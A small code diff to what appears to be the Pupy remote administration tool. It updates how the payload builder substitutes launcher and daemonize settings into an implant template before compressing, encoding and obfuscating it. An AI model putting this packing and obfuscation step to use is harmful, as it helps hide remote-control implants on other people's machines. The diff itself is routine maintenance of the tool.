@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
@@ -43,9 +43,9 @@ def pack_py_payload(conf):
 
     with open(os.path.join(ROOT,"pp.py")) as f:
         code=f.read()
-    code=re.sub(r"LAUNCHER=.*\nLAUNCHER_ARGS=.*", conf, code)
+    code=re.sub(r"DAEMONIZE=.*\nLAUNCHER=.*\nLAUNCHER_ARGS=.*", conf, code)
     fullpayload.append(code+"\n")
-    
+
     return compress_encode_obfs('\n'.join(fullpayload)+"\n")
 
 
